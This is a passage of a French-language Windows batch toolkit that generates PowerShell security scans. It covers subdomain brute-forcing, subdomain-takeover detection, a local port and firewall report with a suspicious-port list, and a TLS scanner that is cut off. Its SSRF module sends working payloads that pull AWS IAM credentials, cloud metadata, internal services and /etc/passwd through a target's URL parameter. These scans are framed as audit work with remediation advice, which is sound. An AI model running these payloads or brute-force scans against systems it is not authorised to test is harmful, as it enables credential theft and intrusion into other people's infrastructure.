echo     } catch { Write-Host "  [ ] Non trouve ou inaccessible" -f DarkGray } >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto cat_recon

:recon_subdomain_brute
cls
echo.
echo  ================================================
echo   BRUTEFORCE DE SOUS-DOMAINES (DNS)
echo  ================================================
echo   Teste 50+ noms courants (api, dev...)
echo   pour detecter des services actifs.
echo.
set "SD_DOM="
set /p "SD_DOM=Domaine racine (ex: michelin.com) : "
if not defined SD_DOM goto cat_recon
set "SD_DOM=%SD_DOM: =%"

set "WPS=%TEMP%\recon_sub_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:SD_DOM >> "%WPS%"
echo $subs = @('www','dev','api','test','staging','beta','mail','vpn','smtp','pop','imap','ns1','ns2','webmail','blog','shop','admin','portal','secure','git','devops','jenkins','docker','kube','aws','azure','cloud','db','mysql','sql','internal','intra','private','corp','support','help','download','app','m','mobile','static','assets','cdn','srv','host') >> "%WPS%"
echo Write-Host "  Demarrage du bruteforce sur $($subs.Count) mots pour $d" -f Cyan >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo $count = 0 >> "%WPS%"
echo $foundCount = 0 >> "%WPS%"
echo foreach ($s in $subs) { >> "%WPS%"
echo     $count++ >> "%WPS%"
echo     $fqdn = $s + '.' + $d >> "%WPS%"
echo     $percent = [math]::Round(($count / $subs.Count) * 100) >> "%WPS%"
echo     Write-Progress -Activity "Bruteforce DNS" -Status "$fqdn ($count/$($subs.Count))" -PercentComplete $percent >> "%WPS%"
echo     try { >> "%WPS%"
echo         $dns = Resolve-DnsName $fqdn -Type A -ErrorAction Stop -Timeout 2 ^| Select-Object -ExpandProperty IPAddress -First 1 >> "%WPS%"
echo         Write-Host "  [+] $fqdn " -NoNewline -f Green; Write-Host "-> $dns" -f White >> "%WPS%"
echo         $foundCount++ >> "%WPS%"
echo         try { >> "%WPS%"
echo             $r = Invoke-WebRequest ("http://" + $fqdn) -Method Head -TimeoutSec 2 -EA Stop -UseBasicParsing >> "%WPS%"
echo             Write-Host "      HTTP 200 ($($r.Headers['Server']))" -f Gray >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } catch {} >> "%WPS%"
echo } >> "%WPS%"
echo Write-Progress -Activity "Bruteforce DNS" -Completed >> "%WPS%"
echo if ($foundCount -gt 0) { >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE DES RISQUES (SOUS-DOMAINES) :" -f Red >> "%WPS%"
echo     Write-Host "  1. Surface d'attaque : Chaque sous-domaine est une porte d'entree potentielle." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Shadow IT : Des serveurs de tests (dev, staging) oublies sont souvent mal patchés." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Fuite d'infrastructure : Revele les technos utilisees (api, git, vpn)." -f Yellow >> "%WPS%"
echo     Write-Host "  CONSEIL : Supprimez les enregistrements DNS inutilises et protegez vos accès." -f Cyan >> "%WPS%"
echo } else { >> "%WPS%"
echo     Write-Host "`n  Scan termine. Aucun sous-domaine supplementaire detecte." -f Cyan >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto cat_recon

:cyber_ssrf
cls
echo.
echo  ===========================================================
echo   SSRF - Server-Side Request Forgery
echo  ===========================================================
echo   Force le serveur a faire des requetes internes
echo   pour extraire des donnees (Cloud/Intranet).
echo  ===========================================================
echo.
set /p "SSRF_URL=URL avec parametre (ex: https://site.com/fetch?url=) : "
if "%SSRF_URL%"=="" goto net_cyber_menu

set "SSRF_PS=%TEMP%\ssrf_test.ps1"
if exist "%SSRF_PS%" del "%SSRF_PS%"

echo $baseUrl = "!SSRF_URL!" > "%SSRF_PS%"
echo $ua = "Mozilla/5.0" >> "%SSRF_PS%"
echo $vulns = 0 >> "%SSRF_PS%"
echo $suspicious = 0 >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo $payloads = @( >> "%SSRF_PS%"
echo    @{ Name='AWS IMDSv1 (metadata)';    URL='http://169.254.169.254/latest/meta-data/';                          Detect='ami-id|instance-id|instance-type|local-ipv4|iam' }, >> "%SSRF_PS%"
echo    @{ Name='AWS IMDSv2 (token)';        URL='http://169.254.169.254/latest/api/token';                          Detect='invalid|PUT required|TTL' }, >> "%SSRF_PS%"
echo    @{ Name='AWS IAM credentials';       URL='http://169.254.169.254/latest/meta-data/iam/security-credentials/'; Detect='RoleName|AccessKeyId|SecretAccessKey|Token|Expiration' }, >> "%SSRF_PS%"
echo    @{ Name='GCP Metadata';              URL='http://metadata.google.internal/computeMetadata/v1/';               Detect='project|instance|id|zone|machine-type' }, >> "%SSRF_PS%"
echo    @{ Name='Azure IMDS';                URL='http://169.254.169.254/metadata/instance?api-version=2021-02-01';   Detect='compute|network|subscriptionId|resourceGroupName' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTP (80)';       URL='http://127.0.0.1/';                                                 Detect='html|<body|server|apache|nginx|iis|express|welcome' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTP (8080)';     URL='http://127.0.0.1:8080/';                                            Detect='html|<body|server|apache|nginx|tomcat|spring' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTPS (443)';     URL='https://127.0.0.1/';                                                Detect='html|<body|server|certificate' }, >> "%SSRF_PS%"
echo    @{ Name='Redis (6379)';              URL='http://127.0.0.1:6379/';                                            Detect='PONG|-ERR|redis_version|connected_clients' }, >> "%SSRF_PS%"
echo    @{ Name='MongoDB (27017)';           URL='http://127.0.0.1:27017/';                                           Detect='mongo|ok.*1|topology|ismaster|MongoDB' }, >> "%SSRF_PS%"
echo    @{ Name='Memcached (11211)';         URL='http://127.0.0.1:11211/';                                           Detect='VERSION|STORED|ERROR|END' }, >> "%SSRF_PS%"
echo    @{ Name='Elasticsearch (9200)';      URL='http://127.0.0.1:9200/';                                            Detect='cluster_name|version|tagline|elasticsearch' }, >> "%SSRF_PS%"
echo    @{ Name='File:// LFI (Linux)';       URL='file:///etc/passwd';                                                Detect='root:x:|daemon:|nobody:|/bin/bash|/bin/sh' }, >> "%SSRF_PS%"
echo    @{ Name='File:// LFI (Windows)';     URL='file:///C:/Windows/win.ini';                                        Detect='\[fonts\]|\[extensions\]|for 16-bit' } >> "%SSRF_PS%"
echo ) >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo Write-Host "  Test de $($payloads.Count) payloads SSRF..." -f Cyan >> "%SSRF_PS%"
echo Write-Host "  (Chaque test timeout apres 6s max)" -f DarkGray >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo foreach ($p in $payloads) { >> "%SSRF_PS%"
echo    Write-Host "  [?] $($p.Name.PadRight(35))" -f Gray -NoNewline >> "%SSRF_PS%"
echo    $start = Get-Date >> "%SSRF_PS%"
echo    try { >> "%SSRF_PS%"
echo        $testUrl = $baseUrl + [uri]::EscapeDataString($p.URL) >> "%SSRF_PS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing -MaximumRedirection 0 >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        if ($r.Content -match $p.Detect) { >> "%SSRF_PS%"
echo            Write-Host "[!!!] SSRF CONFIRME ! (${elapsed}ms)" -f Red >> "%SSRF_PS%"
echo            Write-Host "       Service  : $($p.Name)" -f Magenta >> "%SSRF_PS%"
echo            Write-Host "       Payload  : $($p.URL)" -f Magenta >> "%SSRF_PS%"
echo            $preview = $r.Content -replace '\s+',' ' | ForEach-Object { $_.Substring(0, [math]::Min(200, $_.Length)) } >> "%SSRF_PS%"
echo            Write-Host "       Extrait  : $preview" -f Yellow >> "%SSRF_PS%"
echo            $vulns++ >> "%SSRF_PS%"
echo        } elseif ($r.StatusCode -eq 200 -and $elapsed -lt 500) { >> "%SSRF_PS%"
echo            Write-Host "[~] Reponse 200 rapide (${elapsed}ms) - A verifier manuellement" -f Yellow >> "%SSRF_PS%"
echo            $suspicious++ >> "%SSRF_PS%"
echo        } else { >> "%SSRF_PS%"
echo            Write-Host "[-] HTTP $($r.StatusCode) (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } >> "%SSRF_PS%"
echo    } catch [System.Net.WebException] { >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        $sc = $_.Exception.Response.StatusCode.value__ >> "%SSRF_PS%"
echo        if ($sc) { >> "%SSRF_PS%"
echo            Write-Host "[-] HTTP $sc (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } elseif ($elapsed -ge 5800) { >> "%SSRF_PS%"
echo            Write-Host "[~] TIMEOUT (${elapsed}ms) - Port potentiellement ouvert" -f Yellow >> "%SSRF_PS%"
echo            $suspicious++ >> "%SSRF_PS%"
echo        } else { >> "%SSRF_PS%"
echo            Write-Host "[-] Erreur reseau (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } >> "%SSRF_PS%"
echo    } catch { >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        Write-Host "[-] Bloque (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo    } >> "%SSRF_PS%"
echo } >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"
echo if ($vulns -gt 0) { >> "%SSRF_PS%"
echo    Write-Host "  [!!!] $vulns SSRF confirme(s) !" -f Red >> "%SSRF_PS%"
echo    Write-Host "  Impact possible :" -f Red >> "%SSRF_PS%"
echo    Write-Host "    - Lecture des metadonnees cloud (cles IAM AWS, tokens GCP/Azure)" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Acces aux services internes (Redis, MongoDB, Elasticsearch)" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Lectre de fichiers systeme via file://" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Pivoting vers le reseau interne du serveur" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "" >> "%SSRF_PS%"
echo    Write-Host "  [!] DANGER CRITIQUE : L'attaquant utilise votre serveur comme un rebond" -f Red >> "%SSRF_PS%"
echo    Write-Host "  pour attaquer votre infrastructure interne (Azure, AWS, DB)." -f Red >> "%SSRF_PS%"
echo } elseif ($suspicious -gt 0) { >> "%SSRF_PS%"
echo    Write-Host "  [~] $suspicious reponse(s) suspecte(s) - Verifiez manuellement" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "  Testez avec Burp Suite ou curl pour confirmer." -f DarkGray >> "%SSRF_PS%"
echo } else { >> "%SSRF_PS%"
echo    Write-Host "  [OK] Aucun SSRF detecte sur les payloads testes." -f Green >> "%SSRF_PS%"
echo    Write-Host "  Note : Un WAF peut bloquer les requetes - testez avec d'autres" -f DarkGray >> "%SSRF_PS%"
echo    Write-Host "  encodages (double URL, IPv6, decimal, octal...)" -f DarkGray >> "%SSRF_PS%"
echo } >> "%SSRF_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SSRF_PS%"
if exist "%SSRF_PS%" del "%SSRF_PS%"
echo.
pause
goto net_cyber_menu

:cyber_subdomain_takeover
cls
echo.
echo  ===========================================================
echo   SUBDOMAIN TAKEOVER - Detection
echo  ===========================================================
echo   Verifie si des sous-domaines pointent vers
echo   des services externes abandonnes.
echo  ===========================================================
echo.
set /p "TKO_DOM=Domaine racine cible (ex: monsite.com) : "
if "%TKO_DOM%"=="" goto net_cyber_menu

set "TKO_PS=%TEMP%\takeover.ps1"
if exist "%TKO_PS%" del "%TKO_PS%"

echo $domain = "!TKO_DOM!" > "%TKO_PS%"
echo $ua = "Mozilla/5.0" >> "%TKO_PS%"
echo $vulns = 0 >> "%TKO_PS%"
echo $dangling = 0 >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo $fingerprints = @( >> "%TKO_PS%"
echo    @{ Service='GitHub Pages';        CNAME=@('github.io','github.com');         Error='There isn''t a GitHub Pages site here|For root URLs|Did you mean to visit' }, >> "%TKO_PS%"
echo    @{ Service='Heroku';              CNAME=@('herokuapp.com','herokudns.com');   Error='No such app|heroku\s*\|no-such-app' }, >> "%TKO_PS%"
echo    @{ Service='Netlify';             CNAME=@('netlify.app','netlify.com');       Error='Not Found - Request ID|page not found|netlify.*not found' }, >> "%TKO_PS%"
echo    @{ Service='AWS S3';              CNAME=@('s3.amazonaws.com','s3-website');   Error='NoSuchBucket|The specified bucket does not exist' }, >> "%TKO_PS%"
echo    @{ Service='AWS Elastic Beanstalk'; CNAME=@('elasticbeanstalk.com');          Error='404.*EB|No Application Found|no such application' }, >> "%TKO_PS%"
echo    @{ Service='Azure Blob Storage';  CNAME=@('blob.core.windows.net');           Error='The specified container does not exist|BlobNotFound|ResourceNotFound' }, >> "%TKO_PS%"
echo    @{ Service='Azure CDN';           CNAME=@('azureedge.net','azure.com');       Error='The resource you are looking for has been removed' }, >> "%TKO_PS%"
echo    @{ Service='Fastly';              CNAME=@('fastly.net');                      Error='Fastly error: unknown domain|Please check that this domain has been added' }, >> "%TKO_PS%"
echo    @{ Service='Shopify';             CNAME=@('myshopify.com','shopify.com');     Error='Sorry, this shop is currently unavailable|only accessible to|shop is unavailable' }, >> "%TKO_PS%"
echo    @{ Service='Ghost (Pro)';         CNAME=@('ghost.io','ghostchefs.com');       Error='The thing you were looking for is no longer here|404.*ghost' }, >> "%TKO_PS%"
echo    @{ Service='HubSpot';             CNAME=@('hubspot.net','hubspotpagebuilder'); Error='Domain not configured|does not exist in our system|hs-sites' }, >> "%TKO_PS%"
echo    @{ Service='Zendesk';             CNAME=@('zendesk.com','zendeskservice');    Error='Help Center Closed|Oops! This help center no longer exists' }, >> "%TKO_PS%"
echo    @{ Service='Cargo Collective';    CNAME=@('cargocollective.com');             Error='If you''re moving your domain away from Cargo|404 Not Found.*cargo' }, >> "%TKO_PS%"
echo    @{ Service='Tumblr';              CNAME=@('tumblr.com');                      Error='Whatever you were looking for doesn''t currently exist|There''s nothing here' }, >> "%TKO_PS%"
echo    @{ Service='Squarespace';         CNAME=@('squarespace.com','sqsp.net');      Error='No Such Account|this domain is not connected to a Squarespace site' }, >> "%TKO_PS%"
echo    @{ Service='Pantheon';            CNAME=@('pantheonsite.io','pantheon.io');   Error='404 error: unknown site|The gods are wise|pantheon.io' }, >> "%TKO_PS%"
echo    @{ Service='Vercel';              CNAME=@('vercel.app','now.sh');             Error='The deployment could not be found|This deployment has been disabled|DEPLOYMENT_NOT_FOUND' }, >> "%TKO_PS%"
echo    @{ Service='Surge.sh';            CNAME=@('surge.sh');                        Error='project not found|surge - 404' }, >> "%TKO_PS%"
echo    @{ Service='Webflow';             CNAME=@('webflow.io','proxy.webflow.com'); Error='The page you are looking for doesn''t exist|page has moved|webflow.*404' } >> "%TKO_PS%"
echo ) >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo $subs = @( >> "%TKO_PS%"
echo    'www','api','dev','test','staging','beta','alpha','uat','qa','demo', >> "%TKO_PS%"
echo    'old','legacy','v1','v2','v3','preview','sandbox','pre','preprod', >> "%TKO_PS%"
echo    'admin','portal','dashboard','panel','manage','control', >> "%TKO_PS%"
echo    'blog','news','shop','store','docs','wiki','help','support','kb', >> "%TKO_PS%"
echo    'static','assets','cdn','media','files','downloads','img','images', >> "%TKO_PS%"
echo    'mail','email','smtp','webmail','newsletter','m','mobile','app', >> "%TKO_PS%"
echo    'status','monitor','health','metrics','analytics','track', >> "%TKO_PS%"
echo    'git','repo','jenkins','ci','cd','build','deploy','devops', >> "%TKO_PS%"
echo    'jobs','careers','about','contact','feedback','community' >> "%TKO_PS%"
echo ) >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo Write-Host "  Scan de $($subs.Count) sous-domaines pour $domain..." -f Cyan >> "%TKO_PS%"
echo Write-Host "  Detection de 19 services (GitHub, S3, Heroku, Vercel...)" -f DarkGray >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo foreach ($sub in $subs) { >> "%TKO_PS%"
echo    $fqdn = "$sub.$domain" >> "%TKO_PS%"
echo    try { >> "%TKO_PS%"
echo        $dnsResult = Resolve-DnsName $fqdn -ErrorAction Stop >> "%TKO_PS%"
echo        $cnames = $dnsResult | Where-Object { $_.Type -eq 'CNAME' } | Select-Object -ExpandProperty NameHost >> "%TKO_PS%"
echo        $ips    = $dnsResult | Where-Object { $_.Type -eq 'A' }     | Select-Object -ExpandProperty IPAddress >> "%TKO_PS%"
echo        if (-not $cnames) { continue } >> "%TKO_PS%"
echo        $cnameStr = ($cnames -join ', ') >> "%TKO_PS%"
echo        $matched = $false >> "%TKO_PS%"
echo        foreach ($fp in $fingerprints) { >> "%TKO_PS%"
echo            $hit = $false >> "%TKO_PS%"
echo            foreach ($c in $cnames) { >> "%TKO_PS%"
echo                foreach ($pattern in $fp.CNAME) { >> "%TKO_PS%"
echo                    if ($c -match [regex]::Escape($pattern)) { $hit = $true; break } >> "%TKO_PS%"
echo                } >> "%TKO_PS%"
echo                if ($hit) { break } >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            if (-not $hit) { continue } >> "%TKO_PS%"
echo            $matched = $true >> "%TKO_PS%"
echo            Write-Host "  [CNAME] $fqdn" -f White -NoNewline >> "%TKO_PS%"
echo            Write-Host " -> $cnameStr" -f Gray >> "%TKO_PS%"
echo            Write-Host "         Service detecte : $($fp.Service)" -f Cyan >> "%TKO_PS%"
echo            $confirmed = $false >> "%TKO_PS%"
echo            foreach ($scheme in @('https','http')) { >> "%TKO_PS%"
echo                try { >> "%TKO_PS%"
echo                    $r = Invoke-WebRequest "$scheme`://$fqdn" -UserAgent $ua -TimeoutSec 8 -UseBasicParsing -EA Stop -MaximumRedirection 3 >> "%TKO_PS%"
echo                    if ($r.Content -match $fp.Error) { >> "%TKO_PS%"
echo                        Write-Host "         [!!!] TAKEOVER CONFIRME !" -f Red >> "%TKO_PS%"
echo                        Write-Host "               Fingerprint trouve dans la reponse HTTP" -f Red >> "%TKO_PS%"
echo                        Write-Host "               Action : Reclamez le service '$($fp.Service)'" -f Yellow >> "%TKO_PS%"
echo                        Write-Host "               CNAME dangling : $cnameStr" -f Yellow >> "%TKO_PS%"
echo                        $vulns++; $confirmed = $true; break >> "%TKO_PS%"
echo                    } else { >> "%TKO_PS%"
echo                        Write-Host "         [-] CNAME pointe vers $($fp.Service) mais le service repond (actif)" -f DarkGray >> "%TKO_PS%"
echo                        $confirmed = $true; break >> "%TKO_PS%"
echo                    } >> "%TKO_PS%"
echo                } catch { } >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            if (-not $confirmed) { >> "%TKO_PS%"
echo                Write-Host "         [~] CNAME dangling - Service ne repond pas (potentiellement vulnerable)" -f Yellow >> "%TKO_PS%"
echo                $dangling++ >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            break >> "%TKO_PS%"
echo        } >> "%TKO_PS%"
echo        if (-not $matched) { >> "%TKO_PS%"
echo            Write-Host "  [INFO] $fqdn -> CNAME: $cnameStr (service inconnu)" -f DarkGray >> "%TKO_PS%"
echo        } >> "%TKO_PS%"
echo    } catch { } >> "%TKO_PS%"
echo } >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"
echo if ($vulns -gt 0) { >> "%TKO_PS%"
echo    Write-Host "  [!!!] $vulns takeover(s) CONFIRME(S) !" -f Red >> "%TKO_PS%"
echo    Write-Host "  Un attaquant peut servir du contenu sous votre domaine." -f Red >> "%TKO_PS%"
echo    Write-Host "  Correction : Supprimez les enregistrements CNAME dangling" -f Yellow >> "%TKO_PS%"
echo    Write-Host "  dans votre gestionnaire DNS." -f Yellow >> "%TKO_PS%"
echo } elseif ($dangling -gt 0) { >> "%TKO_PS%"
echo    Write-Host "  [~] $dangling CNAME(s) dangling detecte(s) - Service ne repond pas." -f Yellow >> "%TKO_PS%"
echo    Write-Host "  Verifiez si ces services sont encore actifs." -f DarkGray >> "%TKO_PS%"
echo } else { >> "%TKO_PS%"
echo    Write-Host "  [OK] Aucun subdomain takeover detecte." -f Green >> "%TKO_PS%"
echo } >> "%TKO_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%TKO_PS%"
if exist "%TKO_PS%" del "%TKO_PS%"
echo.
pause
goto net_cyber_menu


:cyber_security_report
cls
echo.
echo  ================================================
echo   RAPPORT DE SECURITE RESEAU COMPLET
echo  ================================================
echo   Effectue un audit global du PC : ports,
echo   processus, firewall et alertes DNS.
echo.
echo  [i] Appuyez sur ECHAP pour annuler la generation.
echo.
echo  Initialisation de l'audit...
set "RPS=%TEMP%\cyber_report.ps1"
if exist "%RPS%" del "%RPS%"

echo Write-Host "  [1/7] Initialisation du fichier..." -f Cyan >> "%RPS%"
echo $f = [System.Environment]::GetFolderPath('Desktop') + '\RapportSecuriteReseau_' + (Get-Date -Format 'yyyyMMdd_HHmm') + '.html' >> "%RPS%"
echo $css = 'body{font-family:Segoe UI,sans-serif;background:#0d1117;color:#e6edf3;padding:20px}h1{color:#f85149;border-bottom:2px solid #f85149;padding-bottom:8px}h2{color:#ff7b72;background:#161b22;padding:8px;border-radius:4px;margin-top:20px}table{width:100%%;border-collapse:collapse;margin:8px 0}th{background:#f85149;color:white;padding:6px;text-align:left}td{padding:5px 8px;border-bottom:1px solid #21262d}tr:hover{background:#1c2128}.ok{color:#3fb950}.danger{color:#f85149}' >> "%RPS%"
echo if ($Host.UI.RawUI.KeyAvailable) { $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($k.VirtualKeyCode -eq 27) { exit } } >> "%RPS%"

echo Write-Host "  [2/7] Analyse des ports TCP en ecoute..." -f Yellow >> "%RPS%"
echo $pt = Get-NetTCPConnection -State Listen -EA SilentlyContinue ^| Sort-Object LocalPort ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>TCP</td><td>$($_.LocalPort)</td><td>$p</td><td>$($_.OwningProcess)</td></tr>" } >> "%RPS%"

echo Write-Host "  [3/7] Analyse des points de terminaison UDP..." -f Yellow >> "%RPS%"
echo $pu = Get-NetUDPEndpoint -EA SilentlyContinue ^| Sort-Object LocalPort ^| Select-Object -First 30 ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>UDP</td><td>$($_.LocalPort)</td><td>$p</td><td>$($_.OwningProcess)</td></tr>" } >> "%RPS%"

echo Write-Host "  [4/7] Cartographie des connexions actives..." -f Yellow >> "%RPS%"
echo $co = Get-NetTCPConnection -State Established -EA SilentlyContinue ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>$p</td><td>$($_.LocalPort)</td><td>$($_.RemoteAddress)</td><td>$($_.RemotePort)</td></tr>" } >> "%RPS%"

echo Write-Host "  [5/7] Audit des profils du Pare-feu..." -f Yellow >> "%RPS%"
echo $fw = Get-NetFirewallProfile ^| ForEach-Object { $s=if($_.Enabled -eq 'True'){'ok'}else{'danger'};$st=if($_.Enabled -eq 'True'){'ACTIF'}else{'INACTIF'}; "<tr><td>$($_.Name)</td><td class='$s'>$st</td><td>$($_.DefaultInboundAction)</td><td>$($_.DefaultOutboundAction)</td></tr>" } >> "%RPS%"

echo Write-Host "  [6/7] Verification de securite (Ports Suspects/DNS)..." -f Yellow >> "%RPS%"
echo $sp = @{1337='DarkComet';4444='Metasploit';5900='VNC';6666='IRC/Bot';31337='BackOrifice';12345='NetBus';3389='RDP';23='Telnet';21='FTP';8080='Proxy'} >> "%RPS%"
echo $op = Get-NetTCPConnection -State Listen -EA SilentlyContinue ^| Select-Object -ExpandProperty LocalPort >> "%RPS%"
echo $al = ($sp.Keys ^| Where-Object { $op -contains $_ } ^| ForEach-Object { "<tr><td class='danger'>ALERTE</td><td>$_</td><td>$($sp[$_])</td></tr>" }) -join '' >> "%RPS%"
echo if (-not $al) { $al = "<tr><td class='ok' colspan='3'>Aucun port suspect detecte</td></tr>" } >> "%RPS%"
echo $dn = Get-DnsClientServerAddress ^| Where-Object { $_.ServerAddresses } ^| ForEach-Object { "<tr><td>$($_.InterfaceAlias)</td><td>$($_.ServerAddresses -join ', ')</td></tr>" } >> "%RPS%"

echo Write-Host "  [7/7] Generation du rapport final..." -f Green >> "%RPS%"
echo $html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Securite Reseau</title><style>$css</style></head><body><h1>Rapport Securite Reseau - $env:COMPUTERNAME</h1><p>Genere le $(Get-Date -Format 'dd/MM/yyyy HH:mm')</p><h2>Alertes Ports Suspects</h2><table><tr><th>Niveau</th><th>Port</th><th>Menace</th></tr>$al</table><h2>Ports en Ecoute</h2><table><tr><th>Proto</th><th>Port</th><th>Processus</th><th>PID</th></tr>$(($pt+$pu) -join '')</table><h2>Connexions Actives</h2><table><tr><th>Processus</th><th>Port Local</th><th>IP Distante</th><th>Port Distant</th></tr>$(($co) -join '')</table><h2>Pare-feu</h2><table><tr><th>Profil</th><th>Statut</th><th>Entrant</th><th>Sortant</th></tr>$(($fw) -join '')</table><h2>DNS</h2><table><tr><th>Interface</th><th>Serveurs</th></tr>$(($dn) -join '')</table></body></html>" >> "%RPS%"
echo $html ^| Out-File $f -Encoding UTF8 >> "%RPS%"
echo Start-Process $f >> "%RPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%RPS%"
if exist "%RPS%" del "%RPS%"
echo.
echo  [OK] Rapport genere sur le Bureau.
pause
goto net_cyber_menu

REM ===================================================================
REM         SCAN TLS / SSL AVANCE (Protocoles et Ciphers faibles)
REM ===================================================================
:cyber_tls_scan
cls
echo.
echo  ===========================================================
echo   SCAN TLS/SSL AVANCE - Detection protocoles faibles
echo  ===========================================================
echo   Analyse la version TLS et la solidite du
echo   certificat pour prevenir les interceptions.
echo  ===========================================================
echo.
echo  Entrez l'hote cible (ex: monsite.com ou IP)
set "ALEEX_TLS_HOST="
set /p "ALEEX_TLS_HOST=Hote : "
if not defined ALEEX_TLS_HOST goto net_cyber_menu

echo  Port (defaut 443, Entree pour valider)
set "ALEEX_TLS_PORT="
set /p "ALEEX_TLS_PORT=Port : "
if not defined ALEEX_TLS_PORT set "ALEEX_TLS_PORT=443"

set "TLS_PS=%TEMP%\tls_scan_%RANDOM%.ps1"
if exist "%TLS_PS%" del /f /q "%TLS_PS%"

echo $host_target = $env:ALEEX_TLS_HOST >> "%TLS_PS%"
echo $port = [int]$env:ALEEX_TLS_PORT >> "%TLS_PS%"
echo $timeout = 5000 >> "%TLS_PS%"
echo $findings = @() >> "%TLS_PS%"
echo $score = 100 >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo function Add-TlsFinding($sev, $msg, $pts) { >> "%TLS_PS%"
echo    $script:score -= $pts >> "%TLS_PS%"
echo    $script:findings += [PSCustomObject]@{ Severite=$sev; Message=$msg } >> "%TLS_PS%"
echo    $c = switch($sev){ 'CRITIQUE' {'Red'}; 'ELEVE' {'DarkYellow'}; 'MOYEN' {'Yellow'}; default {'Cyan'} } >> "%TLS_PS%"
echo    Write-Host "  [$sev] $msg" -f $c >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  Cible : ${host_target}:${port}" -f Cyan >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo $protocols = @( >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='SSLv3';   Enum=[System.Security.Authentication.SslProtocols]::Ssl3;   Sev='CRITIQUE'; Pts=40 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.0'; Enum=[System.Security.Authentication.SslProtocols]::Tls;    Sev='ELEVE';   Pts=25 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.1'; Enum=[System.Security.Authentication.SslProtocols]::Tls11;  Sev='MOYEN';   Pts=10 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.2'; Enum=[System.Security.Authentication.SslProtocols]::Tls12;  Sev='OK';      Pts=0  }, >> "%TLS_PS%"
echo ) >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "  [1/4] Test des versions de protocoles..." -f Blue >> "%TLS_PS%"
echo foreach ($proto in $protocols) { >> "%TLS_PS%"
echo    try { >> "%TLS_PS%"
echo        $tcp = New-Object System.Net.Sockets.TcpClient >> "%TLS_PS%"
echo        $conn = $tcp.BeginConnect($host_target, $port, $null, $null) >> "%TLS_PS%"
echo        if (-not $conn.AsyncWaitHandle.WaitOne($timeout, $false)) { throw "Timeout" } >> "%TLS_PS%"
echo        $tcp.EndConnect($conn) >> "%TLS_PS%"
echo        $stream = $tcp.GetStream() >> "%TLS_PS%"
echo        $ssl = New-Object System.Net.Security.SslStream($stream, $false, { $true }) >> "%TLS_PS%"
